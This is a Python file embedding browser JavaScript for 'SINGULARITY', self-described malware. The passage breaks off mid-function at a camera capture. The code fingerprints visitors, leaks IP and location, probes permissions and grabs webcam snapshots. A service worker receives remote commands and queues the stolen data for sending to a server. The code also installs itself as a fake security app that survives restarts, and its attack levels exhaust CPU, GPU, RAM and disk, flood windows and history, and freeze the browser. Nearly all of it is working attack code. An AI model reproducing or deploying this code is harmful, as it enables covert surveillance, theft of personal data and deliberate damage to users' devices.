"""
SINGULARITY v2.1  --  apex-class resident link virus weapon
===========================================================
ブラウザの権限内で到達可能な物理限界まで振り切り、さらに
PWA として端末に「常駐インストール」させる最上位兵器。
外部依存ゼロ（アイコン生成のみ Pillow があれば使う）。

統合系統（15クラス / 140+シグナル / 5資源同時攻撃 / 常駐化）:
  1  指紋      Canvas / WebGL / AudioContext / フォント実測 / 数学 / コーデック / DRM
  2  環境      ハードウェア / 画面 / DPR / 言語 / TZ / メディアクエリ / standalone判定
  3  ネット    IP / ASN / ISP / 地理 / WebRTCローカルIP漏洩 / VPN・プロキシ・Tor判定
  4  知覚      カメラ静止画 / GPS高精度 / 加速度・ジャイロ / 端末台数
  5  行動      打鍵dwell・flight / マウス軌跡 / クリック / スクロール / タッチ圧
  6  永続      localStorage / IndexedDB / Cache API / OPFS / Service Worker
  7  自己複製  子リンク生成 → 感染チェーン(ref)継承 → 真のウイルスループ
  8  多経路    fetch(keepalive) → sendBeacon → 画像ピクセル → SWオフラインキュー
  9  隠密      可視UIなし / スクリプト自己完結 / 痕跡消去(kill-switch)
 10  判定      人間スコア / bot判定 / 端末クラス / ステルス度 / ハニーポット
 11  検知回避  adblock検知 / プライベートモード推定 / 権限一括照会
 12  資源攻撃  CPU(全コア) / GPU(シェーダ) / RAM(膨張) / ディスク(枯渇) / 履歴(洪水)
 13  応答性    メインスレッド凍結(Atomics.wait) / タブ閉鎖抵抗 / 画面常時点灯
 14  制御      Service Worker 経由の遠隔コマンド（凍結中でも効く）
 15  常駐      PWAインストール / 偽セキュリティソフト偽装 / OSログイン自動起動 /
               ファイル・プロトコル・共有ハンドラ乗っ取り / focus-existing

レベル（監視室から遠隔変更・0〜5）:
  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点

インストール後は最低 installLevel（既定4）で回り続ける。
「chrome://apps から消す」まで、再起動しても勝手に蘇る。
"""
from __future__ import annotations

import base64
import json
import secrets
import time
from typing import Any, Dict, Optional

VIRUS_ID = "singularity"
VIRUS_NAME = "SINGULARITY"
VIRUS_NAME_JA = "特異点"
VIRUS_VERSION = "2.2"
VIRUS_CLASS = "apex"

LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点"}
LEVEL_DESC = {
    0: "指紋と位置だけ。静か。",
    1: "偵察のみ（既定）。",
    2: "CPU全コアとGPUを回し始める。",
    3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
    4: "ディスクをquotaの85%まで書き込む。",
    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯。最終形態。",
}

APP_NAME_DEFAULT = "脆弱性ブロッカー"

# ---------------------------------------------------------------------------
# Worker（CPU/GPU/RAM を担当。メインスレッドが凍結しても動き続ける）
# ---------------------------------------------------------------------------
WORKER_JS = r"""
/*! SINGULARITY worker v2.1 */
self.onmessage = function (e) {
  var d = e.data || {};
  if (d.kind === "stop") { try { self.close(); } catch (er) {} return; }
  if (d.kind !== "burn") return;

  if (d.mb) {
    try {
      var a = new Float64Array((d.mb * 1048576) / 8);
      for (var i = 0; i < a.length; i += 4096) a[i] = i;
      self.__keep = a;
    } catch (er) {}
  }

  if (d.gpu) gpu();

  var sink = 0, k = 0;
  for (;;) {
    for (var j = 0; j < 150000; j++) { sink += Math.sqrt(j) * Math.sin(j); }
    k++;
    if (sink > 1e12) sink = 0;
    if (k % 40 === 0) { try { self.postMessage({ kind: "tick", k: k }); } catch (er) {} }
  }
};

function gpu() {
  try {
    if (typeof OffscreenCanvas === "undefined") return;
    var c = new OffscreenCanvas(400, 300);
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return;
    var vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
    var fs = "precision highp float;uniform float t;void main(){"
      + "vec2 u=gl_FragCoord.xy*.01;float s=0.;"
      + "for(int i=0;i<48;i++){u=vec2(sin(u.y*t*.001)+cos(u.x*t*.0007),"
      + "cos(u.x*t*.0011)-sin(u.y*t*.0009));s+=length(u);}"
      + "gl_FragColor=vec4(fract(s*.01),fract(s*.013),fract(s*.017),1.);}";
    function sh(t, src) { var o = gl.createShader(t); gl.shaderSource(o, src); gl.compileShader(o); return o; }
    var pr = gl.createProgram();
    gl.attachShader(pr, sh(gl.VERTEX_SHADER, vs));
    gl.attachShader(pr, sh(gl.FRAGMENT_SHADER, fs));
    gl.linkProgram(pr); gl.useProgram(pr);
    var b = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, b);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 3, -1, -1, 3]), gl.STATIC_DRAW);
    var loc = gl.getAttribLocation(pr, "p");
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
    var tl = gl.getUniformLocation(pr, "t");
    (function loop() {
      try { gl.uniform1f(tl, Date.now()); gl.drawArrays(gl.TRIANGLES, 0, 3); } catch (er) {}
      setTimeout(loop, 0);
    })();
  } catch (er) {}
}
"""

# ---------------------------------------------------------------------------
# Service Worker（コマンド受信・永続化・オフラインキュー・復活・インストール支援）
# ---------------------------------------------------------------------------
SW_JS = r"""
/*! SINGULARITY service worker v2.1 -- command channel + persistence + resurrection */
const VER = "sg-v2";
const DB = "sg", STORE = "out", KV = "kv";
let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [];
let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false;

function idb() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => {
      const d = r.result;
      if (!d.objectStoreNames.contains(STORE)) d.createObjectStore(STORE, { autoIncrement: true });
      if (!d.objectStoreNames.contains(KV)) d.createObjectStore(KV);
    };
    r.onsuccess = () => res(r.result);
    r.onerror = () => rej(r.error);
  });
}
async function kvGet(k) {
  try { const d = await idb(); return await new Promise(r => {
    const q = d.transaction(KV, "readonly").objectStore(KV).get(k);
    q.onsuccess = () => r(q.result); q.onerror = () => r(null); }); } catch (e) { return null; }
}
async function kvSet(k, v) {
  try { const d = await idb(); d.transaction(KV, "readwrite").objectStore(KV).put(v, k); } catch (e) {}
}
async function queue(body) {
  try { const d = await idb(); d.transaction(STORE, "readwrite").objectStore(STORE).add({ body, t: Date.now() }); } catch (e) {}
}
async function drain() {
  try {
    const d = await idb();
    const cur = d.transaction(STORE, "readwrite").objectStore(STORE).openCursor();
    cur.onsuccess = async () => {
      const c = cur.result; if (!c || !CMD) return;
      try {
        const r = await fetch(CMD, { method: "POST", headers: { "Content-Type": "application/json" }, body: c.value.body });
        if (r.ok) c.delete();
      } catch (e) { return; }
      c.continue();
    };
  } catch (e) {}
}
async function load() {
  CMD = await kvGet("cmd"); PAGE = await kvGet("page");
  SID = await kvGet("sid"); MAN = await kvGet("man");
  lastLevel = await kvGet("level"); lastWipe = await kvGet("wipe");
}
async function precache() {
  if (preCached || !MAN) return;
  preCached = true;
  try {
    const c = await caches.open(VER);
    const urls = [MAN].concat(ICONS || []);
    for (const u of urls) { try { await c.add(u); } catch (e) {} }
    if (PAGE) { try { await c.add(PAGE); } catch (e) {} }
  } catch (e) {}
}
async function go(why) {
  try {
    const cls = await self.clients.matchAll({ type: "window", includeUncontrolled: true });
    for (const c of cls) {
      try {
        const u = new URL(c.url);
        if (why === "wipe") u.searchParams.set("wipe", "1"); else u.searchParams.delete("wipe");
        c.navigate(u.toString());
      } catch (e) {}
    }
  } catch (e) {}
}
async function check() {
  const t = Date.now();
  if (t - lastCheck < 2500) return;
  lastCheck = t;
  if (!CMD) await load();
  if (!CMD) return;
  try {
    const r = await fetch(CMD + "?sw=1&sid=" + (SID || ""), { cache: "no-store" });
    const j = await r.json();
    if (!j || !j.ok) return;
    const lv = String(j.level), wp = String(j.wipe || 0);
    if (lastLevel === null) {
      lastLevel = lv; lastWipe = wp;
      await kvSet("level", lv); await kvSet("wipe", wp); return;
    }
    if (wp !== lastWipe) { lastWipe = wp; await kvSet("wipe", wp); await go("wipe"); return; }
    if (lv !== lastLevel) { lastLevel = lv; await kvSet("level", lv); await go("level"); return; }
  } catch (e) {}
}
async function netFirst(req) {
  let c = null;
  try { c = await caches.open(VER); } catch (e) {}
  try {
    const r = await Promise.race([
      fetch(req),
      new Promise((_, rej) => setTimeout(() => rej(new Error("t")), 4000))
    ]);
    if (c) { try { c.put(req, r.clone()); } catch (e) {} }
    return r;
  } catch (e) {
    if (c) {
      let hit = null;
      try { hit = await c.match(req); } catch (er) {}
      if (!hit) { try { hit = await c.match(req, { ignoreSearch: true }); } catch (er) {} }
      if (hit) return hit;
    }
    return new Response(
      "<!doctype html><meta charset=utf-8><body style=\"background:#05070a;color:#0f0;" +
      "font:13px ui-monospace;display:grid;place-items:center;height:100vh;margin:0\">" +
      "<div>SINGULARITY<br><small>offline</small></div></body>",
      { headers: { "Content-Type": "text/html; charset=utf-8" } });
  }
}

self.addEventListener("install", e => self.skipWaiting());
self.addEventListener("activate", e => {
  e.waitUntil(self.clients.claim());
  e.waitUntil(load().then(precache));
});
self.addEventListener("message", e => {
  const d = e.data || {};
  if (d.type === "hello") {
    if (d.cmd) kvSet("cmd", d.cmd);
    if (d.page) kvSet("page", d.page);
    if (d.sid) kvSet("sid", d.sid);
    if (d.man) kvSet("man", d.man);
    if (d.icons) ICONS = d.icons;
    if (d.level != null) kvSet("level", String(d.level));
    CMD = d.cmd || CMD; SID = d.sid || SID; MAN = d.man || MAN;
    load().then(precache).then(check);
  }
  if (d.type === "check") check();
  if (d.type === "queue") queue(d.body);
  if (d.type === "drain") drain();
});
self.addEventListener("sync", e => { if (e.tag === "sg-flush") e.waitUntil(drain()); });
self.addEventListener("fetch", e => {
  let u; try { u = new URL(e.request.url); } catch (er) { return; }
  if (u.origin !== location.origin) return;
  if (u.pathname.indexOf("/v/") === 0) e.waitUntil(check());
  if (CMD && u.pathname === new URL(CMD, location.origin).pathname && !navigator.onLine) drain();
  if (e.request.mode === "navigate") e.respondWith(netFirst(e.request));
});
"""

# ---------------------------------------------------------------------------
# ペイロード本体（ブラウザで実行される JS）
# ---------------------------------------------------------------------------
PAYLOAD_JS = r"""
/*! SINGULARITY v2.1 -- apex-class resident link virus weapon | igtracker */
(function () {
"use strict";
if (window.__SINGULARITY__) return;
window.__SINGULARITY__ = true;

/* ================= utils ================= */
function Q(k) { try { return new URLSearchParams(location.search).get(k); } catch (e) { return null; } }
function clamp(v, a, b) { return v < a ? a : (v > b ? b : v); }
function now() { return Date.now(); }
function rid(n) { var C = "abcdefghijklmnopqrstuvwxyz0123456789", s = ""; while (n--) s += C[(Math.random() * 36) | 0]; return s; }
function uniq(a) { return a.filter(function (v, i) { return a.indexOf(v) === i; }); }
function hash(s) { s = String(s); var h = 2166136261; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = (h * 16777619) >>> 0; } return ("00000000" + h.toString(16)).slice(-8); }
function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ""; } }
function tz() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { return null; } }
function mm(q) { try { return matchMedia(q).matches; } catch (e) { return false; } }
function ls(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }

/* ================= config ================= */
var CFG = Object.assign({
  sid: null, path: "/v/singularity", collect: "/v/singularity/collect",
  cmd: "/v/singularity/cmd", sw: "/v/singularity/sw.js",
  manifest: null, icons: [],
  level: 1, fire: 1, wipe: false, w: 0, freeze: "",
  cores: 0, ramMB: 0, diskRatio: 0, chunkMB: 8, gpu: false, workerMB: 16,
  windows: 0, winDelay: 1400, history: 0, notify: 0, burn: false,
  audio: false, beepMs: 4500, flicker: true, flickMs: 900,
  uncloseable: true, persist: true, swOn: true, mutate: true, remember: true,
  media: true, geo: true, sensors: true, clipboard: false, badge: false,
  wakelock: false, titleFlicker: true,
  install: "auto", installLevel: 4, avName: "脆弱性ブロッカー",
  interval: 12000, cmdInterval: 3000, timeout: 4000, maxRetry: 6
}, window.__SINGULARITY_CFG__ || {});

var LEVEL = parseInt(CFG.level, 10); if (isNaN(LEVEL)) LEVEL = 1;
var W = parseInt(CFG.w, 10) || 0;

/* beforeinstallprompt は早く来るので、真っ先に捕まえる */
var BIP = null;
addEventListener("beforeinstallprompt", function (e) {
  try { e.preventDefault(); } catch (er) {}
  BIP = e;
  try { window.__sgBip = true; } catch (er) {}
});

var PRESET = {
  0: { burn: false, gpu: false, ramMB: 0, diskRatio: 0, windows: 0, history: 0, notify: 0, freeze: "off", audio: false, wakelock: false },
  1: { burn: false, gpu: false, ramMB: 0, diskRatio: 0, windows: 0, history: 0, notify: 0, freeze: "off", audio: false, wakelock: false },
  2: { burn: true, gpu: true, ramMB: 0, diskRatio: 0, windows: 0, history: 0, notify: 0, freeze: "off", audio: false, wakelock: true },
  3: { burn: true, gpu: true, ramMB: 0, diskRatio: 0, windows: 8, history: 3000, notify: 12, freeze: "off", audio: true, wakelock: true },
  4: { burn: true, gpu: true, ramMB: 0, diskRatio: 0.85, windows: 16, history: 6000, notify: 24, freeze: "off", audio: true, wakelock: true },
  5: { burn: true, gpu: true, ramMB: 0, diskRatio: 0.95, windows: 24, history: 12000, notify: 40, freeze: "soft", audio: true, wakelock: true }
};

function applyLevel(l) {
  LEVEL = clamp(l, 0, 5);
  var p = PRESET[LEVEL] || PRESET[1];
  for (var k in p) CFG[k] = p[k];
  if (LEVEL >= 2) {
    CFG.cores = clamp(navigator.hardwareConcurrency || 4, 1, 24);
    CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * 0.25);
  } else { CFG.cores = 0; CFG.ramMB = 0; }
}
applyLevel(LEVEL);

var STANDALONE = false;
try {
  STANDALONE = !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches)
    || !!navigator.standalone
    || !!(window.matchMedia && matchMedia("(display-mode: window-controls-overlay)").matches);
} catch (e) {}
if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);

/* ================= state ================= */
var SID = CFG.sid || rid(14);
var T0 = now();
var R = {
  v: "2.1", sid: SID, t0: T0, t: T0, level: LEVEL, w: W,
  usb: Q("u") || null,                      // ← 追加（USB経由の識別タグ）
  host: location.host, url: location.href, ref: document.referrer || null,
  chain: [], env: {}, page: {}, network: {}, vectors: {}, hardware: {},
  privacy: {}, media: {}, bot: {}, behavioral: {}, viral: {}, verdict: {},
  disk: {}, ram: {}, burn: {}, history: {}, audio: {}, win: {}, install: {},
  errors: [], attempts: 0
};
var WORKERS = [];
function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 140)); if (R.errors.length > 40) R.errors.shift(); } catch (_) {} }

/* ================= 1. 環境 ================= */
function base() {
  var n = navigator, s = screen;
  R.env = {
    ua: n.userAgent, platform: n.platform || null, vendor: n.vendor || null,
    languages: (n.languages || [n.language || "?"]).slice(0, 12), language: n.language || null,
    timezone: tz(), tzOffsetMin: new Date().getTimezoneOffset(),
    screen: { w: s.width, h: s.height, availW: s.availWidth, availH: s.availHeight,
              depth: s.colorDepth, dpr: devicePixelRatio || 1 },
    window: { w: innerWidth, h: innerHeight, outerW: outerWidth, outerH: outerHeight },
    touch: { max: n.maxTouchPoints || 0, coarse: mm("(pointer:coarse)"), hover: mm("(hover:hover)") },
    hw: { cores: n.hardwareConcurrency || null, memoryGB: n.deviceMemory || null },
    cookieEnabled: n.cookieEnabled, doNotTrack: n.doNotTrack || null, webdriver: !!n.webdriver,
    plugins: [].slice.call(n.plugins || []).map(function (p) { return p.name; }).slice(0, 20),
    pdfViewer: !!n.pdfViewerEnabled, reducedMotion: mm("(prefers-reduced-motion: reduce)"),
    darkMode: mm("(prefers-color-scheme: dark)"),
    colorGamut: mm("(color-gamut: p3)") ? "p3" : (mm("(color-gamut: srgb)") ? "srgb" : "none"),
    iframe: (function () { try { return window.self !== window.top; } catch (e) { return true; } })(),
    opener: !!window.opener, historyLength: history.length,
    secureContext: !!window.isSecureContext,
    standalone: STANDALONE, displayMode: displayMode(),
    installed: !!navigator.standalone || ls("sg:installed") === "1",
    os: osGuess(), browser: browserGuess(),
    crossOriginIsolated: !!window.crossOriginIsolated,
    sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
    launchQueue: !!window.launchQueue, getInstalledRelatedApps: !!navigator.getInstalledRelatedApps
  };
}
function displayMode() {
  try {
    if (matchMedia("(display-mode: standalone)").matches) return "standalone";
    if (matchMedia("(display-mode: window-controls-overlay)").matches) return "wco";
    if (matchMedia("(display-mode: minimal-ui)").matches) return "minimal-ui";
    if (matchMedia("(display-mode: fullscreen)").matches) return "fullscreen";
    return "browser";
  } catch (e) { return "?"; }
}
function osGuess() {
  var ua = navigator.userAgent;
  if (/Windows NT 10/.test(ua)) return "Windows 10/11";
  if (/Windows/.test(ua)) return "Windows";
  if (/Android/.test(ua)) return "Android";
  if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
  if (/Mac OS X/.test(ua)) return "macOS";
  if (/CrOS/.test(ua)) return "ChromeOS";
  if (/Linux/.test(ua)) return "Linux";
  return navigator.platform || "unknown";
}
function browserGuess() {
  var ua = navigator.userAgent;
  if (/Edg\//.test(ua)) return "Edge";
  if (/OPR\/|Opera/.test(ua)) return "Opera";
  if (/SamsungBrowser/.test(ua)) return "Samsung Internet";
  if (/FxiOS/.test(ua)) return "Firefox iOS";
  if (/Firefox\//.test(ua)) return "Firefox";
  if (/CriOS/.test(ua)) return "Chrome iOS";
  if (/Chrome\//.test(ua)) return "Chrome";
  if (/Safari\//.test(ua)) return "Safari";
  return "unknown";
}

/* ================= 2. ページ ================= */
function pageMeta() {
  R.page = {
    title: document.title || null, forms: document.forms.length,
    inputs: document.querySelectorAll("input").length,
    links: document.querySelectorAll("a").length, images: document.images.length,
    scripts: document.scripts.length, lang: document.documentElement.lang || null,
    charset: document.characterSet, readyState: document.readyState
  };
}

/* ================= 3. 指紋 ================= */
function canvasFP() {
  try {
    var c = document.createElement("canvas"), x = c.getContext("2d");
    c.width = 260; c.height = 60;
    x.textBaseline = "top"; x.font = "14px Arial";
    x.fillStyle = "#f60"; x.fillRect(0, 0, 120, 22);
    x.fillStyle = "#069"; x.fillText("SINGULARITY", 2, 15);
    x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("SINGULARITY", 4, 30);
    x.globalCompositeOperation = "multiply";
    x.fillStyle = "rgb(255,0,255)"; x.beginPath(); x.arc(50, 40, 20, 0, Math.PI * 2, true); x.fill();
    x.fillStyle = "rgb(0,255,255)"; x.beginPath(); x.arc(70, 40, 20, 0, Math.PI * 2, true); x.fill();
    var d = c.toDataURL();
    return { hash: hash(d), bytes: d.length };
  } catch (e) { return null; }
}
function webglFP() {
  try {
    var c = document.createElement("canvas");
    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    var dbg = gl.getExtension("WEBGL_debug_renderer_info");
    var o = {
      vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER),
      gpuVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
      gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
      glVersion: gl.getParameter(gl.VERSION),
      maxTexture: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      extCount: (gl.getSupportedExtensions() || []).length
    };
    o.hash = hash(JSON.stringify(o));
    return o;
  } catch (e) { return null; }
}
function audioFP() {
  try {
    var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return;
    var ctx = new AC(1, 44100, 44100), osc = ctx.createOscillator();
    osc.type = "triangle"; osc.frequency.value = 10000;
    var comp = ctx.createDynamicsCompressor();
    comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
    comp.attack.value = 0; comp.release.value = 0.25;
    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
    ctx.oncomplete = function (e) {
      var d = e.renderedBuffer.getChannelData(0), sum = 0;
      for (var i = 4500; i < 5000; i++) sum += Math.abs(d[i]);
      R.vectors.audio = { hash: hash(sum.toFixed(8)), sample: +sum.toFixed(8) };
      push(false);
    };
    ctx.startRendering();
  } catch (e) { err_(e); }
}
var FONTS = ["Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS", "Consolas",
  "Courier New", "Georgia", "Impact", "Lucida Console", "Malgun Gothic", "Meiryo",
  "Microsoft YaHei", "MS Gothic", "MS PGothic", "MS UI Gothic", "Palatino Linotype",
  "Segoe UI", "SimSun", "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana",
  "Yu Gothic", "Yu Gothic UI", "Hiragino Kaku Gothic ProN", "Hiragino Sans",
  "Noto Sans JP", "Helvetica Neue", "Roboto", "Ubuntu", "DejaVu Sans", "Menlo", "Monaco"];
function fontFP() {
  try {
    var b = "mmmmmmmmmmlli", bases = ["monospace", "sans-serif", "serif"];
    var sp = document.createElement("span");
    sp.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;";
    sp.textContent = b; document.body.appendChild(sp);
    var w = {};
    bases.forEach(function (f) { sp.style.fontFamily = f; w[f] = sp.offsetWidth + "x" + sp.offsetHeight; });
    var hit = [];
    FONTS.forEach(function (f) {
      var ok = bases.some(function (b2) {
        sp.style.fontFamily = "'" + f + "'," + b2;
        return sp.offsetWidth + "x" + sp.offsetHeight !== w[b2];
      });
      if (ok) hit.push(f);
    });
    sp.remove();
    return { count: hit.length, detected: hit, hash: hash(hit.join("|")) };
  } catch (e) { return null; }
}
function mathFP() {
  var out = [];
  try {
    out.push(Math.tan(-1e300), Math.sinh(1), Math.cosh(10), Math.tanh(0.5),
             Math.asinh(1), Math.acosh(1e300), Math.expm1(1), Math.log1p(10),
             Math.pow(Math.PI, -100), Math.atan2(1e300, 1e-300));
  } catch (e) {}
  return { hash: hash(out.join(",")) };
}

/* ================= 4. ネット / 地理 / リーク ================= */
var TZ_CC = { "Asia/Tokyo": "JP", "Asia/Seoul": "KR", "Asia/Shanghai": "CN", "Asia/Taipei": "TW",
  "Asia/Hong_Kong": "HK", "Asia/Singapore": "SG", "Asia/Bangkok": "TH", "Asia/Jakarta": "ID",
  "Asia/Manila": "PH", "Asia/Kolkata": "IN", "Asia/Dubai": "AE", "Asia/Jerusalem": "IL",
  "Europe/London": "GB", "Europe/Paris": "FR", "Europe/Berlin": "DE", "Europe/Madrid": "ES",
  "Europe/Rome": "IT", "Europe/Moscow": "RU", "Europe/Amsterdam": "NL", "Europe/Warsaw": "PL",
  "Europe/Istanbul": "TR", "America/New_York": "US", "America/Chicago": "US", "America/Denver": "US",
  "America/Los_Angeles": "US", "America/Phoenix": "US", "America/Sao_Paulo": "BR",
  "America/Mexico_City": "MX", "America/Toronto": "CA", "Australia/Sydney": "AU",
  "Pacific/Auckland": "NZ", "Africa/Cairo": "EG", "Africa/Lagos": "NG", "Africa/Johannesburg": "ZA" };

function jget(url) {
  return new Promise(function (res) {
    var t = setTimeout(function () { res(null); }, CFG.timeout);
    fetch(url, { mode: "cors", cache: "no-store" })
      .then(function (r) { return r.json(); })
      .then(function (j) { clearTimeout(t); res(j); })
      .catch(function () { clearTimeout(t); res(null); });
  });
}
function netIntel() {
  return Promise.all([
    jget("https://ipapi.co/json/"), jget("https://ipwho.is/"),
    jget("https://api.ipify.org?format=json")
  ]).then(function (a) {
    var i = a[0] || {}, w = a[1] || {}, f = a[2] || {}, c = w.connection || {};
    var g = {
      ip: i.ip || w.ip || f.ip || null, city: i.city || w.city || null,
      region: i.region || w.region || null, country: i.country_name || w.country || null,
      countryCode: i.country_code || w.country_code || null,
      lat: i.latitude || w.latitude || null, lon: i.longitude || w.longitude || null,
      asn: i.asn || c.asn || null, isp: c.isp || i.org || null, org: i.org || c.org || null,
      postal: i.postal || w.postal || null, currency: i.currency || null
    };
    R.network.ip = g;
    var blob = String(g.org || "") + " " + String(g.isp || "");
    R.network.vpnHint = /hosting|cloud|vpn|proxy|digitalocean|linode|ovh|hetzner|amazon|aws|google|microsoft|m247|choopa|leaseweb|contabo|vultr|oracle/i.test(blob);
    var tzc = TZ_CC[R.env.timezone];
    R.network.tzGeoMismatch = !!(tzc && g.countryCode && tzc !== g.countryCode);
    return g;
  });
}
function webrtc() {
  return new Promise(function (res) {
    var out = { local: [], public: [], mdns: [] };
    try {
      var RTC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
      if (!RTC) return res(null);
      var pc = new RTC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      try { pc.createDataChannel("s"); } catch (e) {}
      pc.onicecandidate = function (e) {
        if (!e.candidate) return;
        var m = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[0-9a-f]{8}-[0-9a-f-]+\.local)/i.exec(e.candidate.candidate);
        if (!m) return;
        var v = m[0];
        if (/\.local$/i.test(v)) out.mdns.push(v);
        else if (/^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)/.test(v)) out.local.push(v);
        else out.public.push(v);
      };
      pc.createOffer().then(function (o) { return pc.setLocalDescription(o); }).catch(function () {});
      setTimeout(function () {
        try { pc.close(); } catch (e) {}
        out.local = uniq(out.local); out.public = uniq(out.public); out.mdns = uniq(out.mdns);
        R.network.webrtc = out;
        R.network.ipLeak = out.public[0] || null;
        res(out);
      }, 2500);
    } catch (e) { res(null); }
  });
}

/* ================= 5. プライバシー / 検知回避 ================= */
function testStore(kind) {
  try { var s = window[kind]; s.setItem("__sg", "1"); s.removeItem("__sg"); return true; }
  catch (e) { return false; }
}
function privacy() {
  R.privacy = {
    localStorage: testStore("localStorage"), sessionStorage: testStore("sessionStorage"),
    indexedDB: !!window.indexedDB, cacheAPI: !!window.caches,
    serviceWorker: !!navigator.serviceWorker, cookies: navigator.cookieEnabled,
    opfs: !!(navigator.storage && navigator.storage.getDirectory),
    webAssembly: typeof WebAssembly !== "undefined",
    webgl2: (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })()
  };
  if (navigator.storage && navigator.storage.estimate) {
    navigator.storage.estimate().then(function (e) {
      R.privacy.quotaMB = e.quota ? Math.round(e.quota / 1048576) : null;
      R.privacy.usageMB = e.usage ? +(e.usage / 1048576).toFixed(1) : null;
      R.privacy.incognitoHint = e.quota ? e.quota < 1300 * 1048576 : null;
      push(false);
    }).catch(function () {});
  }
}
function adblock() {
  var bait = document.createElement("div");
  bait.className = "adsbox ad-banner pub_300x250 text-ad";
  bait.style.cssText = "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;";
  document.body.appendChild(bait);
  setTimeout(function () {
    try {
      var st = getComputedStyle(bait);
      R.privacy.adblock = bait.offsetHeight === 0 || bait.offsetWidth === 0 || st.display === "none";
      bait.remove();
    } catch (e) {}
    push(false);
  }, 250);
}
function perms() {
  if (!navigator.permissions || !navigator.permissions.query) return;
  R.privacy.permissions = {};
  ["geolocation", "notifications", "camera", "microphone", "clipboard-read", "midi",
   "push", "accelerometer", "gyroscope"].forEach(function (name) {
    try {
      navigator.permissions.query({ name: name }).then(function (s) {
        R.privacy.permissions[name] = s.state; push(false);
      }).catch(function () {});
    } catch (e) {}
  });
}

/* ================= 6. ハードウェア ================= */
function codecs() {
  var v = document.createElement("video"), a = document.createElement("audio");
  var can = function (el, t) { try { return el.canPlayType(t) || "no"; } catch (e) { return "no"; } };
  R.hardware.codecs = {
    h264: can(v, 'video/mp4; codecs="avc1.42E01E"'),
    hevc: can(v, 'video/mp4; codecs="hvc1.1.6.L93.B0"'),
    vp9: can(v, 'video/webm; codecs="vp9"'),
    av1: can(v, 'video/mp4; codecs="av01.0.05M.08"'),
    opus: can(a, 'audio/webm; codecs="opus"'), aac: can(a, 'audio/mp4; codecs="mp4a.40.2"')
  };
  try {
    if (navigator.requestMediaKeySystemAccess) {
      navigator.requestMediaKeySystemAccess("com.widevine.alpha", [{
        initDataTypes: ["cenc"],
        videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"', robustness: "SW_SECURE_CRYPTO" }]
      }]).then(function () { R.hardware.drm = "widevine"; push(false); })
        .catch(function () { R.hardware.drm = "none"; });
    }
  } catch (e) {}
  try {
    var B = navigator.getBattery && navigator.getBattery();
    if (B && B.then) B.then(function (b) {
      R.hardware.battery = { level: Math.round(b.level * 100), charging: b.charging };
      push(false);
    }).catch(function () {});
  } catch (e) {}
}
function benchmark() {
  var t = performance.now(), n = 0;
  (function loop() {
    n++;
    if (n < 200 && performance.now() - t < 600) return requestAnimationFrame(loop);
    R.hardware.fps = Math.round(n / ((performance.now() - t) / 1000));
    push(false);
  })();
}

/* ================= 7. 知覚 ================= */
function devices() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return;
  navigator.mediaDevices.enumerateDevices().then(function (l) {
    var k = {}, labels = [];
    l.forEach(function (d) { k[d.kind] = (k[d.kind] || 0) + 1; if (d.label) labels.push(d.kind + ":" + d.label); });
    R.media.devices = { counts: k, total: l.length, labels: labels.slice(0, 20) };
    push(false);
  }).catch(function () {});
}
function camera() {
  if (!CFG.media || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
  navigator.mediaDevices.getUserMedia({ audio: false, video: { width: { ideal: 320 }, height: { ideal: 240 }, facingMode: "user" } })
    .then(function (st) {
      var v = document.createElement("video");
      v.muted = true; v.playsInline = true; v.srcObject = st;
      v.onloadedmetadata = function () {
        v.play().then(function () {
          setTimeout(function () {
            try {
              var c = document.createElement("canvas");
              c.width = 240; c.height = 180;
              c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
              R.media.snapshot = c.toDataURL("image/jpeg", 0.6);
